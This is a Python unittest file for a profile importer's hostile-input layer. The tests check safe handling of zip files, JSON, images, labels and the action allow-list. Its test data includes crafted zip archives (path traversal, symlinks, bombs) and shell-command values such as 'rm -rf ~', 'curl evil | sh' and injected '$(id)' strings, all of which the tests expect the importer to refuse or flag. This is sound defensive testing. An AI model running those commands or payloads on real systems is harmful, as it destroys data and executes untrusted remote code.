"""core/importers/_common.py: the hostile-input layer every importer builds on (bounded zips,
JSON, images, labels, page names, key combos, the imported-action allow-list and to_config)."""
import hashlib
import io
import os
import shlex
import stat
import struct
import unittest
import zipfile
import zlib
from unittest import mock

from tests.helpers import EXAMPLE, Deck
from tests.test_multideck import make_bot

import yaml  # noqa: E402
from PIL import Image, PngImagePlugin  # noqa: E402

from core import importer  # noqa: E402
from core.importers import _common as c  # noqa: E402
from core.paths import state_dir  # noqa: E402


# ------------------------------------------------------------------ zip builders

def zbytes(entries, method=zipfile.ZIP_DEFLATED):
    """A zip of [(name | ZipInfo, bytes)] built in memory."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", method) as z:
        for name, data in entries:
            z.writestr(name, data)
    return buf.getvalue()


def headers(data, sig):
    i = data.find(sig)
    while i >= 0:
        yield i
        i = data.find(sig, i + 1)


def patch_u16(data, sig, off, fn):
    b = bytearray(data)
    for i in headers(data, sig):
        (v,) = struct.unpack_from("<H", b, i + off)
        struct.pack_into("<H", b, i + off, fn(v))
    return bytes(b)


def patch_u32(data, sig, off, value):
    b = bytearray(data)
    for i in headers(data, sig):
        struct.pack_into("<I", b, i + off, value)
    return bytes(b)


LOCAL, CENTRAL = b"PK\x03\x04", b"PK\x01\x02"


def png(w=8, h=8, color=(200, 30, 30, 255), **save):
    buf = io.BytesIO()
    Image.new("RGBA", (w, h), color).save(buf, format="PNG", **save)
    return buf.getvalue()


def png_header_only(w, h):
    """A PNG whose IHDR claims w×h, with a token IDAT (never valid to decode at that size)."""
    def chunk(kind, body):
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", zlib.crc32(kind + body))
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", zlib.compress(b"\0" * 64)) + chunk(b"IEND", b"")


class ZipTest(unittest.TestCase):
    def bad(self, data, *names_to_read):
        with self.assertRaises(c.ImportError_):
            z = c.open_zip(data)
            for n in names_to_read:
                z.read(n)

    def test_good_zip_reads_and_lookup(self):
        z = c.open_zip(zbytes([("A.sdProfile/manifest.json", b"{}"), ("A.sdProfile/Images/", b""),
                               ("A.sdProfile/Images/K.png", b"img")]))
        self.assertEqual(z.names(), ["A.sdProfile/manifest.json", "A.sdProfile/Images/K.png"])
        self.assertEqual(z.read("A.sdProfile/manifest.json"), b"{}")
        self.assertEqual(z.lookup("a.sdprofile/images/k.png"), "A.sdProfile/Images/K.png")
        self.assertEqual(z.lookup("A.sdProfile\\Images\\K.png"), "A.sdProfile/Images/K.png")
        for evil in ("../A.sdProfile/manifest.json", "/A.sdProfile/manifest.json",
                     "A.sdProfile/../A.sdProfile/manifest.json", "C:\\x", None, "a\0b"):
            self.assertIsNone(z.lookup(evil))
        with self.assertRaises(KeyError):
            z.read("nope")

    def test_traversal_and_absolute_names(self):
        for name in ("../x", "/abs", "C:\\x", "c:x", "a\\..\\..\\x", "a/../../x", "a/./../../x"):
            with self.subTest(name=name):
                self.bad(zbytes([(name, b"x")]))

    def test_symlink_entry(self):
        info = zipfile.ZipInfo("link")
        info.create_system = 3
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        self.bad(zbytes([(info, b"/etc/passwd")]))
        fifo = zipfile.ZipInfo("fifo")
        fifo.external_attr = (stat.S_IFIFO | 0o644) << 16
        self.bad(zbytes([(fifo, b"")]))

    def test_duplicate_names(self):
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")      # zipfile warns about the duplicate it writes
            self.bad(zbytes([("a.json", b"1"), ("a.json", b"2")]))
        self.bad(zbytes([("d/a.json", b"1"), ("d\\a.json", b"2")]))
        self.bad(zbytes([("A.json", b"1"), ("a.json", b"2")]))

    def test_nul_in_name(self):
        data = zbytes([("aXb.json", b"{}")]).replace(b"aXb", b"a\0b")
        self.bad(data)

    def test_control_char_in_name(self):
        self.bad(zbytes([("a\x1bb.json", b"{}")]))

    def test_encrypted_entry(self):
        data = zbytes([("a.json", b"{}")])
        for sig, off in ((LOCAL, 6), (CENTRAL, 8)):
            data = patch_u16(data, sig, off, lambda v: v | 1)
        self.bad(data)
        # only the local header says encrypted: still refused
        data = patch_u16(zbytes([("a.json", b"{}")]), LOCAL, 6, lambda v: v | 1)
        self.bad(data)

    def test_bz2_and_lzma_refused(self):
        self.bad(zbytes([("a.json", b"{}" * 100)], zipfile.ZIP_BZIP2))
        self.bad(zbytes([("a.json", b"{}" * 100)], zipfile.ZIP_LZMA))

    def test_local_header_understates_size(self):
        data = zbytes([("a.bin", os.urandom(4000))], zipfile.ZIP_STORED)
        data = patch_u32(data, LOCAL, 22, 100)            # local uncompressed size: 100 (really 4000)
        self.bad(data)
        data = patch_u32(zbytes([("a.bin", os.urandom(4000))], zipfile.ZIP_STORED), LOCAL, 18, 100)
        self.bad(data)

    def test_both_headers_understate_size(self):
        payload = os.urandom(4000)
        data = zbytes([("a.bin", payload)], zipfile.ZIP_STORED)
        for sig, coff, uoff in ((LOCAL, 18, 22), (CENTRAL, 20, 24)):
            data = patch_u32(data, sig, coff, 100)
            data = patch_u32(data, sig, uoff, 100)
        z = c.open_zip(data)                              # consistent headers, so it opens...
        with self.assertRaises(c.ImportError_):
            z.read("a.bin")                               # ...but the bytes don't match (CRC)

    def test_deflate_size_lie(self):
        data = zbytes([("a.json", b"x" * 5000)])
        for sig, off in ((LOCAL, 22), (CENTRAL, 24)):
            data = patch_u32(data, sig, off, 10)
        with self.assertRaises(c.ImportError_):
            c.open_zip(data).read("a.json")

    def test_ratio_bomb(self):
        self.bad(zbytes([("bomb.json", b"\0" * (5 << 20))]))

    def test_entry_too_big(self):
        self.bad(zbytes([("big.bin", os.urandom(c.MAX_ENTRY_BYTES + 1))], zipfile.ZIP_STORED))

    def test_read_cap(self):
        z = c.open_zip(zbytes([("a.json", os.urandom(5000))], zipfile.ZIP_STORED))
        with self.assertRaises(c.ImportError_):
            z.read("a.json", max_bytes=1000)

    def test_total_budget_counts_reads(self):
        z = c.open_zip(zbytes([("a.bin", b"x" * 1000)]))
        z._budget.read = c.MAX_TOTAL_BYTES - 10
        with self.assertRaises(c.ImportError_):
            z.read("a.bin")

    def test_too_many_entries(self):
        self.bad(zbytes([(f"f{i}", b"") for i in range(c.MAX_ENTRIES + 1)], zipfile.ZIP_STORED))
        c.open_zip(zbytes([(f"f{i}", b"") for i in range(50)], zipfile.ZIP_STORED))

    def test_central_directory_count_lie(self):
        # EOCD claims 1 entry but the directory holds 3000: zipfile would parse them all
        data = zbytes([(f"f{i}", b"") for i in range(3000)], zipfile.ZIP_STORED)
        i = data.rfind(b"PK\x05\x06")
        b = bytearray(data)
        struct.pack_into("<HH", b, i + 8, 1, 1)
        self.bad(bytes(b))

    def test_nested_zip(self):
        inner2 = zbytes([("deep.json", b"{}")])
        inner = zbytes([("inner2.zip", inner2), ("x.json", b"{}")])
        outer = c.open_zip(zbytes([("inner.zip", inner)]))
        nested = outer.open_nested("inner.zip")
        self.assertEqual(nested.read("x.json"), b"{}")
        with self.assertRaises(c.ImportError_):
            nested.open_nested("inner2.zip")

    def test_nested_zip_shares_entry_budget(self):
        inner = zbytes([(f"i{i}", b"") for i in range(600)], zipfile.ZIP_STORED)
        outer = c.open_zip(zbytes([("inner.zip", inner)] + [(f"o{i}", b"") for i in range(1500)],
                                  zipfile.ZIP_STORED))
        with self.assertRaises(c.ImportError_):
            outer.open_nested("inner.zip")

    def test_nested_zip_validated(self):
        outer = c.open_zip(zbytes([("inner.zip", zbytes([("../x", b"")]))]))
        with self.assertRaises(c.ImportError_):
            outer.open_nested("inner.zip")

    def test_end_record_too_close_to_the_end(self):
        for tail in (b"PK\x05\x06", b"PK\x05\x06" + b"\0" * 17):
            with self.subTest(n=len(tail)):
                self.bad(b"x" * 100 + tail)

    def test_not_a_zip(self):
        for data in (b"", b"hello", b"PK\x05\x06" + b"\1" * 18, os.urandom(1000)):
            self.bad(data)

    def test_error_messages_never_quote_names(self):
        try:
            c.open_zip(zbytes([("../secret-token-abc", b"")]))
        except c.ImportError_ as e:
            self.assertNotIn("secret-token-abc", str(e))
        else:
            self.fail("not refused")


class JsonTest(unittest.TestCase):
    def test_ok(self):
        self.assertEqual(c.safe_json(b'{"a": [1, {"b": "]]]"}]}'), {"a": [1, {"b": "]]]"}]})
        self.assertEqual(c.safe_json("\ufeff[1]".encode()), [1])
        deep = []
        for _ in range(63):
            deep = [deep]
        self.assertEqual(c.safe_json(b"[" * 64 + b"]" * 64), deep)        # exactly the limit

    def test_depth_bomb(self):
        for data in (b"[" * 65 + b"]" * 65, b'{"a":' * 100000 + b"1" + b"}" * 100000, b"[" * 500000):
            with self.assertRaises(c.ImportError_):
                c.safe_json(data)
        with self.assertRaises(c.ImportError_):
            c.safe_json(b"[[[[1]]]]", max_depth=3)

    def test_brackets_in_strings_dont_count(self):
        self.assertEqual(c.safe_json(b'["' + b"[" * 200 + b'"]'), ["[" * 200])

    def test_adversarial_strings_are_linear(self):
        import time
        for data in (b'"' + b'\\"' * ((c.MAX_JSON_BYTES - 1) // 2),            # unterminated, all \"
                     b'["' + b"\\\\" * ((c.MAX_JSON_BYTES - 4) // 2) + b'"]',   # all \\ (valid)
                     b'"' + b"\\" * (c.MAX_JSON_BYTES - 1),
                     b"[" + b'"[",' * ((c.MAX_JSON_BYTES - 2) // 4) + b"]"):
            with self.subTest(head=data[:8]):
                self.assertLessEqual(len(data), c.MAX_JSON_BYTES)
                start = time.perf_counter()
                try:
                    c.safe_json(data)
                except c.ImportError_:
                    pass
                self.assertLess(time.perf_counter() - start, 1.0)

    def test_escapes_tracked(self):
        self.assertEqual(c.safe_json(b'["\\\\", [1]]'), ["\\", [1]])      # \\ ends; [1] still counted
        with self.assertRaises(c.ImportError_):
            c.safe_json(b'["\\\\", [[[1]]]]', max_depth=3)
        self.assertEqual(c.safe_json(b'["\\"[[[[", 1]', max_depth=1), ['"[[[[', 1])

    def test_oversized(self):
        with self.assertRaises(c.ImportError_):
            c.safe_json(b" " * (c.MAX_JSON_BYTES + 1) + b"1")

    def test_invalid(self):
        for data in (b"{", b"\xff\xfe", b"NaN", b"[Infinity]", b"1" * 5000):
            with self.subTest(data=data[:10]):
                with self.assertRaises(c.ImportError_):
                    c.safe_json(data)

    def test_messages_dont_quote(self):
        try:
            c.safe_json(b'{"password": "hunter2"')
        except c.ImportError_ as e:
            self.assertNotIn("hunter2", str(e))


class ImageTest(unittest.TestCase):
    def setUp(self):
        self.budget = c.ImageBudget()

    def imp(self, data, budget=None):
        return c.import_image(data, source="test", budget=budget or self.budget)

    def test_output_png_small_no_metadata_sha_named_private(self):
        info = PngImagePlugin.PngInfo()
        info.add_text("Comment", "secret-comment")
        info.add_itxt("XML:com.adobe.xmp", "<x:xmpmeta/>")
        exif = Image.Exif()
        exif[0x010e] = "secret-exif"
        path = self.imp(png(1000, 500, pnginfo=info, exif=exif))
        self.assertIsNotNone(path)
        self.assertTrue(os.path.isabs(path))
        folder = os.path.join(state_dir(), "icons", "imported", "test")
        self.assertEqual(os.path.dirname(path), folder)
        with open(path, "rb") as f:
            out = f.read()
        self.assertEqual(os.path.basename(path), hashlib.sha256(out).hexdigest() + ".png")
        for marker in (b"tEXt", b"iTXt", b"zTXt", b"eXIf", b"secret", b"iCCP"):
            self.assertNotIn(marker, out)
        with Image.open(path) as img:
            self.assertEqual(img.format, "PNG")
            self.assertLessEqual(max(img.size), 288)
            self.assertEqual(img.size, (288, 144))
        self.assertEqual(stat.S_IMODE(os.stat(path).st_mode), 0o600)
        for d in (folder, os.path.dirname(folder), os.path.dirname(os.path.dirname(folder))):
            self.assertEqual(stat.S_IMODE(os.stat(d).st_mode), 0o700)
        self.assertEqual(self.budget.warnings, [])
        self.assertFalse([n for n in os.listdir(folder) if n.endswith(".tmp")])

    def test_same_image_once(self):
        a = self.imp(png(color=(1, 2, 3, 255)))
        b = self.imp(png(color=(1, 2, 3, 255)))
        self.assertEqual(a, b)
        self.assertEqual(self.budget.icons, 1)

    def test_jpeg_gif_webp_ok(self):
        for fmt in ("JPEG", "GIF", "WEBP"):
            buf = io.BytesIO()
            Image.new("RGB", (40, 30), (10, 200, 10)).save(buf, format=fmt)
            with self.subTest(fmt=fmt):
                self.assertIsNotNone(self.imp(buf.getvalue()))

    def test_refused_formats(self):
        eps = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\nshowpage\n"
        tiff, ico, bmp = io.BytesIO(), io.BytesIO(), io.BytesIO()
        Image.new("RGB", (16, 16)).save(tiff, format="TIFF")
        Image.new("RGB", (16, 16)).save(ico, format="ICO")
        Image.new("RGB", (16, 16)).save(bmp, format="BMP")
        for name, data in (("eps", eps), ("tiff", tiff.getvalue()), ("ico", ico.getvalue()),
                           ("bmp", bmp.getvalue())):
            with self.subTest(fmt=name):
                b = c.ImageBudget()
                self.assertIsNone(self.imp(data, b))
                self.assertTrue(b.warnings)

    def test_svg_refused_with_warning(self):
        for svg in (b'<svg xmlns="http://www.w3.org/2000/svg"/>',
                    b'\xef\xbb\xbf<?xml version="1.0"?>\n<svg/>'):
            b = c.ImageBudget()
            self.assertIsNone(self.imp(svg, b))
            self.assertTrue(any("SVG" in w for w in b.warnings))

    def test_huge_dimensions_refused_before_decoding(self):
        data = png_header_only(20000, 20000)
        with mock.patch.object(PngImagePlugin.PngImageFile, "load",
                               side_effect=AssertionError("decoded a 400 Mpx image")):
            self.assertIsNone(self.imp(data))
        # refused by our 16 Mpx check, or by Pillow's own bomb check inside Image.open (> 2× its limit)
        self.assertTrue(any("16 megapixels" in w or "bomb" in w for w in self.budget.warnings))
        b = c.ImageBudget()
        self.assertIsNone(c.import_image(png_header_only(5000, 4000), source="test", budget=b))
        self.assertTrue(any("16 megapixels" in w for w in b.warnings))

    def test_decompression_bomb_warning_is_an_error(self):
        with mock.patch.object(c, "MAX_PIXELS", 10 ** 9), mock.patch.object(Image, "MAX_IMAGE_PIXELS", 1000):
            self.assertIsNone(self.imp(png(40, 40)))        # 1600 px > Pillow's (patched) limit → warning
        self.assertTrue(any("bomb" in w for w in self.budget.warnings))

    def test_gif_frame_cap(self):
        def gif(n):
            frames = [Image.new("P", (4, 4), i % 2) for i in range(n)]
            for f in frames:
                f.putpalette([0, 0, 0, 255, 255, 255] + [0] * 762)
            buf = io.BytesIO()
            frames[0].save(buf, format="GIF", save_all=True, append_images=frames[1:], disposal=1)
            return buf.getvalue()
        self.assertIsNotNone(self.imp(gif(10)))
        self.assertIsNone(self.imp(gif(301)))
        self.assertTrue(any("300 frames" in w for w in self.budget.warnings))

    def test_damaged(self):
        self.assertIsNone(self.imp(png()[:40]))
        self.assertIsNone(self.imp(b""))

    def test_budget(self):
        b = c.ImageBudget(max_icons=1)
        self.assertIsNotNone(self.imp(png(color=(9, 9, 9, 255)), b))
        self.assertIsNone(self.imp(png(color=(8, 8, 8, 255)), b))
        b = c.ImageBudget(max_bytes=10)
        self.assertIsNone(self.imp(png(), b))
        self.assertTrue(b.warnings)

    def test_preview_icons_commit_and_cleanup(self):
        token = "tok-" + "a" * 20
        b = c.ImageBudget(preview=token)
        path = self.imp(png(color=(77, 1, 1, 255)), b)
        lost = self.imp(png(color=(78, 1, 1, 255)), b)
        preview_dir = os.path.join(state_dir(), "icons", "imported", ".preview", token)
        self.assertEqual(os.path.dirname(path), os.path.join(preview_dir, "test"))
        final = os.path.join(state_dir(), "icons", "imported", "test", os.path.basename(path))
        self.assertFalse(os.path.exists(final))                        # nothing in place before apply
        self.assertEqual(stat.S_IMODE(os.stat(preview_dir).st_mode), 0o700)
        cfg, _ = c.to_config({"source": "test", "decks": [deck(None, (3, 1), {"p": [[
            {"label": "a", "icon": path}, {"label": "b", "icon": path}, {"label": "c", "icon": lost}]]}, "p")]})
        self.assertEqual(cfg["pages"]["p"][0][0]["icon"], path)          # to_config accepts preview icons
        os.unlink(lost)                                                 # e.g. cleaned up meanwhile
        out = c.commit_preview_icons(cfg, token)
        row = out["pages"]["p"][0]
        self.assertEqual((row[0]["icon"], row[1]["icon"]), (final, final))
        self.assertNotIn("icon", row[2])
        self.assertEqual(cfg["pages"]["p"][0][0]["icon"], path)          # the input isn't changed
        self.assertTrue(os.path.isfile(final))
        self.assertEqual(stat.S_IMODE(os.stat(final).st_mode), 0o600)
        self.assertFalse(os.path.exists(preview_dir))
        with self.assertRaises(ValueError):
            c.commit_preview_icons(cfg, "../../x")
        with self.assertRaises(ValueError):
            c.ImageBudget(preview="a/b")

        old, new = "old-" + "b" * 20, "new-" + "c" * 20
        for t in (old, new):
            self.imp(png(color=(79, 1, 1, 255)), c.ImageBudget(preview=t))
        root = os.path.join(state_dir(), "icons", "imported", ".preview")
        os.utime(os.path.join(root, old), (1, 1))
        import time
        self.assertEqual(c.cleanup_preview_icons(older_than=3600, now=time.time()), 1)
        self.assertFalse(os.path.exists(os.path.join(root, old)))
        self.assertTrue(os.path.exists(os.path.join(root, new)))
        self.assertEqual(c.cleanup_preview_icons(older_than=0, now=time.time() + 10), 1)

    def test_bad_source_name(self):
        with self.assertRaises(ValueError):
            c.import_image(png(), source="../x", budget=self.budget)


class TextTest(unittest.TestCase):
    def test_clean_label(self):
        self.assertEqual(c.clean_label("\u202eevil\u202c \x07Go\u200b Live\u2066!\u2069"), "evil Go Live!")
        self.assertEqual(c.clean_label("👨\u200d👩\u200d👧"), "👨\u200d👩\u200d👧")    # ZWJ kept
        self.assertEqual(c.clean_label("two\r\nlines"), "two\nlines")
        self.assertEqual(c.clean_label("a\u2028b\ue000c\x00d"), "abcd")
        self.assertEqual(len(c.clean_label("x" * 500)), 64)
        self.assertEqual(c.clean_label(None), "")
        self.assertEqual(c.clean_label(42), "")

    def test_page_name(self):
        taken = set()
        self.assertEqual(c.page_name("Main Page!", taken), "main_page")
        self.assertEqual(c.page_name("main page", taken), "main_page_2")
        self.assertEqual(c.page_name("Back", taken), "back_2")
        self.assertEqual(c.page_name("Pages", taken), "pages_2")
        self.assertEqual(c.page_name("START_PAGE", taken), "start_page_2")
        self.assertEqual(c.page_name("", taken), "page")
        self.assertEqual(c.page_name("Café ☕", taken), "cafe")
        self.assertEqual(c.page_name("../../etc", taken), "etc")
        long = c.page_name("y" * 100, taken)
        self.assertEqual(long, "y" * 32)
        self.assertEqual(c.page_name("y" * 100, taken), "y" * 30 + "_2")
        self.assertEqual(taken, {"main_page", "main_page_2", "back_2", "pages_2", "start_page_2", "page", "cafe",
                                 "etc", long, "y" * 30 + "_2"})
        for n in taken:
            self.assertRegex(n, r"^[a-z0-9_-]{1,32}$")

    def test_combo(self):
        self.assertEqual(c.combo({"shift", "ctrl"}, "A"), "ctrl+shift+a")
        self.assertEqual(c.combo({"Win", "option"}, "F5"), "alt+super+F5")
        self.assertEqual(c.combo(set(), "minus"), "minus")
        self.assertEqual(c.combo({"cmd"}, "/"), "super+/")
        for mods, key in (({"hyper"}, "a"), (set(), "+"), (set(), ""), (set(), "a b"), (set(), "x;rm"),
                          (set(), None)):
            with self.assertRaises(ValueError):
                c.combo(mods, key)

    def test_vk(self):
        self.assertEqual(c.vk_key(65), "a")
        self.assertEqual(c.vk_key(48), "0")
        self.assertEqual(c.vk_key(112), "F1")
        self.assertEqual(c.vk_key(123), "F12")
        self.assertEqual(c.vk_key(13), "Return")
        self.assertIsNone(c.vk_key(-1))
        self.assertIsNone(c.vk_key(True))


class ActionTest(unittest.TestCase):
    def sa(self, a, oid="x.y"):
        return c.safe_action(a, source="test", original_id=oid)

    def review(self, a):
        out = self.sa(a, "orig.id")
        self.assertEqual(out, {"needs_review": {"imported_action": a, "source": "test", "original_id": "orig.id"}})

    def test_live_pass_through(self):
        for a in ({"page": "main"}, {"page": "back"}, {"brightness": "cycle"}, {"brightness": 50},
                  {"delay": 0.5}, {"notify": "Hello"}, {"obs_scene": "Gameplay"}, {"obs_mute": "Mic/Aux"},
                  {"obs_studio": "toggle"}, {"media": "play_pause"}, {"volume": "up"}, {"volume": "50%"},
                  {"mic": "mute"}):
            with self.subTest(a=a):
                self.assertEqual(self.sa(a), a)

    def test_dangerous_need_review(self):
        for a in ({"run": "rm -rf ~"}, {"keys": "ctrl+alt+t"}, {"type": "curl evil | sh\n"},
                  {"hold": "ctrl"}, {"http": {"url": "http://x"}}, {"obs": "ToggleStream"},
                  {"obs_screenshot": "~"}, {"ha": {"service": "x"}}, {"ha_light": {}}, {"twitch": "marker"},
                  {"twitch_ad": 30}, {"radio": "next"}, {"countdown": 5}, {"obs_color": {}}):
            with self.subTest(a=a):
                self.review(a)

    def test_live_kind_with_odd_argument_needs_review(self):
        for a in ({"volume": "50%; rm -rf ~"}, {"volume": "$(id)"}, {"delay": 1e9}, {"delay": True},
                  {"brightness": "999"}, {"media": "PlayPause; x"}, {"notify": "--icon=/etc/x"},
                  {"obs_scene": "a\u202eb"}, {"obs_studio": "on"}, {"mic": "toggle"},
                  {"page": "main", "run": "x"}, {"page": ["main"]}, {}):
            with self.subTest(a=a):
                self.review(a)

    def test_lists(self):
        live = [{"obs_scene": "BRB"}, {"delay": 1}, {"page": "brb"}]
        self.assertEqual(self.sa(live), live)
        self.review([{"obs_scene": "BRB"}, {"keys": "ctrl+m"}])
        self.review([{"obs_scene": "BRB"}, [{"run": "x"}]])
        self.review([{"obs_scene": "BRB"}, "run me"])

    def test_string_and_odd_types_rejected(self):
        for a in ("firefox", None, 5, {"run": object()}, {1: "x"}):
            with self.assertRaises(TypeError):
                self.sa(a)

    def test_needs_action(self):
        self.assertEqual(c.needs_action("com.x\u202e", "Not\x07 supported"),
                         {"needs_action": {"original_id": "com.x", "note": "Not supported"}})

    def test_urls(self):
        url = "https://twitch.tv/x?a=1&b=';rm${IFS}-rf$(id)`x`"
        out = c.url_action(url, source="test", original_id="web")
        imported = out["action"]["needs_review"]["imported_action"]
        self.assertEqual(shlex.split(imported["run"]), ["xdg-open", url])
        for bad in ("javascript:alert(1)", "file:///etc/passwd", "ftp://x", "https://", "//x.y",
                    "https://a b", "https://x\n", "-https://x", "steam://run/1", "", None, "https://x\u202e"):
            with self.subTest(url=bad):
                out = c.url_action(bad, source="test", original_id="web")
                self.assertEqual(set(out), {"needs_action"})
                self.assertEqual(out["needs_action"]["original_id"], "web")


def deck(model, grid, pages, start):
    return {"model": model, "grid": grid, "pages": pages, "start_page": start}


class ToConfigTest(unittest.TestCase):
    def setUp(self):
        self.icon = c.import_image(png(color=(5, 6, 7, 255)), source="test", budget=c.ImageBudget())

    def test_flat_pages_renamed_and_page_actions_fixed(self):
        setup = {"source": "test", "warnings": [], "decks": [deck(None, (3, 1), {
            "Main Page": [[{"label": "Go", "action": {"page": "Second!"}},
                           {"label": "Multi", "action": [{"obs_scene": "A"}, {"page": "Second!"}]},
                           {"label": "Rev", "action": {"needs_review": {
                               "imported_action": [{"keys": "ctrl+a"}, {"page": "Main Page"}],
                               "source": "test", "original_id": "m"}}}]],
            "Second!": [[{"label": "Back", "action": {"page": "back"}}, None,
                         {"label": "Gone", "action": {"page": "Nowhere"}}]]}, "Second!")]}
        cfg, info = c.to_config(setup)
        self.assertEqual(set(cfg), {"pages", "start_page"})
        self.assertEqual(info, {"source": "test", "model": None, "grid": [3, 1]})
        self.assertEqual(list(cfg["pages"]), ["main_page", "second"])
        self.assertEqual(cfg["start_page"], "second")
        main = cfg["pages"]["main_page"][0]
        self.assertEqual(main[0]["action"], {"page": "second"})
        self.assertEqual(main[1]["action"], [{"obs_scene": "A"}, {"page": "second"}])
        self.assertEqual(main[2]["action"]["needs_review"]["imported_action"],
                         [{"keys": "ctrl+a"}, {"page": "main_page"}])
        second = cfg["pages"]["second"][0]
        self.assertEqual(second[0]["action"], {"page": "back"})
        self.assertIsNone(second[1])
        self.assertNotIn("action", second[2])
        self.assertIn("needs_action", second[2])

    def test_several_decks_get_layouts_by_grid_never_model(self):
        setup = {"source": "test", "decks": [
            deck("Stream Deck XL", (8, 4), {"a": [[{"label": "x"}]]}, "a"),
            deck(None, (2, 2), {"b": [[{"label": "y"}]]}, "b")]}
        cfg, info = c.to_config(setup)
        self.assertEqual(set(cfg), {"layouts"})
        self.assertEqual(set(cfg["layouts"]), {"8x4", "2x2"})
        self.assertEqual(info, {"source": "test", "decks": [
            {"model": "Stream Deck XL", "grid": [8, 4], "layout": "8x4"},
            {"model": None, "grid": [2, 2], "layout": "2x2"}]})
        xl = cfg["layouts"]["8x4"]
        self.assertEqual(xl["start_page"], "a")
        self.assertEqual(len(xl["pages"]["a"]), 4)
        self.assertTrue(all(len(r) == 8 for r in xl["pages"]["a"]))

    def test_multi_deck_merges_into_existing_grid_layouts(self):
        with open(EXAMPLE) as f:
            current = yaml.safe_load(f)
        before = {k: dict(v) for k, v in current["layouts"].items()}
        cfg, _ = c.to_config({"source": "test", "decks": [
            deck("Stream Deck XL", (8, 4), {"Imported": [[{"label": "Hi", "action": {"page": "Imported"}}]],
                                            "Main": [[{"label": "mine?"}]]}, "Imported"),
            deck("Stream Deck Mini", (3, 2), {"Small": [[{"label": "S"}]]}, "Small")]})
        p = importer.plan(current, cfg)
        added = [a["path"] for a in p["added"]]
        self.assertIn("layouts.8x4.pages.imported", added)
        self.assertIn("layouts.3x2.pages.small", added)
        self.assertIn("layouts.8x4.pages.main", [x["path"] for x in p["conflicts"]])
        merged, _ = importer.apply(current, cfg, importer.defaults(p))
        self.assertEqual(set(merged["layouts"]), set(before))              # no model-named layout
        for lname, pages in before.items():
            for name, keys in pages.items():
                if name not in ("pages", "start_page"):
                    self.assertEqual(importer._layout_parts(merged["layouts"][lname])[0][name], keys)
        self.assertIn("imported", importer._layout_parts(merged["layouts"]["8x4"])[0])
        self.assertIn("small", importer._layout_parts(merged["layouts"]["3x2"])[0])

    def test_single_known_model_still_gives_flat_pages(self):
        cfg, info = c.to_config({"source": "test", "decks": [
            deck("Stream Deck Mini", (5, 5), {"M": [[{"label": "x"}]]}, "M")]})
        self.assertEqual(set(cfg), {"pages", "start_page"})              # never a model-named layout
        self.assertEqual(cfg["start_page"], "m")
        self.assertEqual(len(cfg["pages"]["m"]), 2)                       # the model's grid wins
        self.assertTrue(all(len(r) == 3 for r in cfg["pages"]["m"]))
        self.assertEqual(info, {"source": "test", "model": "Stream Deck Mini", "grid": [3, 2]})

    def test_same_grid_twice_gets_its_own_layout(self):
        setup = {"source": "test", "warnings": [], "decks": [
            deck("Stream Deck Mini", (3, 2), {"Main": []}, "Main"),
            {**deck("Stream Deck Mini", (3, 2), {"Main": [[{"action": {"page": "Main"}}]]}, "Main"),
             "serial": "AL12K2C01234"},
            deck("Stream Deck Mini", (3, 2), {"Main": []}, "Main")]}
        cfg, info = c.to_config(setup)
        self.assertEqual(list(cfg["layouts"]), ["3x2", "3x2-2", "3x2-3"])
        self.assertEqual(list(cfg["layouts"]["3x2-2"]["pages"]), ["main"])
        self.assertEqual(cfg["layouts"]["3x2-2"]["pages"]["main"][0][0]["action"], {"page": "main"})
        self.assertEqual(cfg["devices"], {"AL12K2C01234": {"layout": "3x2-2"}})
        self.assertEqual([d["layout"] for d in info["decks"]], ["3x2", "3x2-2", "3x2-3"])
        self.assertTrue(any("3x2-3" in w for w in setup["warnings"]))      # no serial: pick it in the panel
        # devices[serial].layout is how the bot shows that deck its own layout
        bot = make_bot(cfg, Deck("Stream Deck Mini", serial="OTHER-MINI"), Deck("Stream Deck Mini", serial="AL12K2C01234"))
        self.assertEqual(bot.session("OTHER-MINI").layout_name, "3x2")
        self.assertEqual(bot.session("AL12K2C01234").layout_name, "3x2-2")
        hostile = c.to_config({"source": "test", "decks": [
            deck(None, (3, 2), {"a": []}, "a"), {**deck(None, (3, 2), {"b": []}, "b"), "serial": "../x y"}]})[0]
        self.assertNotIn("devices", hostile)

    def test_keys_resanitised(self):
        setup = {"source": "test", "warnings": [], "decks": [deck(None, (4, 1), {"p": [[
            {"label": "\u202eHi\x07", "icon": "/etc/passwd", "bg": "red; x", "fg": "#ABC", "state": {"cmd": "x"},
             "confirm": False, "action": {"run": "rm -rf ~"}},
            {"icon": self.icon, "bg": "#112233", "needs_action": {"original_id": "z", "note": "n"},
             "action": {"page": "back"}},
            "saved_key_name",
            {"icon": "emoji:🎮", "action": "firefox"}, {"label": "extra column"}]]}, "p")]}
        cfg, _ = c.to_config(setup)
        row = cfg["pages"]["p"][0]
        self.assertEqual(len(row), 4)
        self.assertEqual(row[0], {"label": "Hi", "fg": "#aabbcc", "action": {"needs_review": {
            "imported_action": {"run": "rm -rf ~"}, "source": "test", "original_id": ""}}})
        self.assertEqual(row[1], {"icon": self.icon, "bg": "#112233",
                                  "needs_action": {"original_id": "z", "note": "n"}})
        self.assertIsNone(row[2])
        self.assertEqual(row[3]["icon"], "emoji:🎮")
        self.assertIn("needs_action", row[3])
        self.assertTrue(any("grid" in w for w in setup["warnings"]))
        self.assertTrue(any("icons" in w for w in setup["warnings"]))

    def test_page_cap(self):
        pages = {f"p{i}": [] for i in range(c.MAX_PAGES + 5)}
        cfg, _ = c.to_config({"source": "test", "decks": [deck(None, (1, 1), pages, "p0")]})
        self.assertEqual(len(cfg["pages"]), c.MAX_PAGES)

    def test_bad_setups(self):
        for setup in ({"source": "test", "decks": []}, {"source": "test", "decks": [deck(None, (0, 0), {"a": []}, "a")]}):
            with self.assertRaises(c.ImportError_):
                c.to_config(setup)
        with self.assertRaises(ValueError):
            c.to_config({"source": "../x", "decks": []})

    def test_plan_accepts_it(self):
        with open(EXAMPLE) as f:
            current = yaml.safe_load(f)
        cfg, _ = c.to_config({"source": "test", "decks": [deck(None, (8, 4), {"Imported": [[
            {"label": "Hi", "action": {"page": "Imported"}}]]}, "Imported")]})
        p = importer.plan(current, cfg)
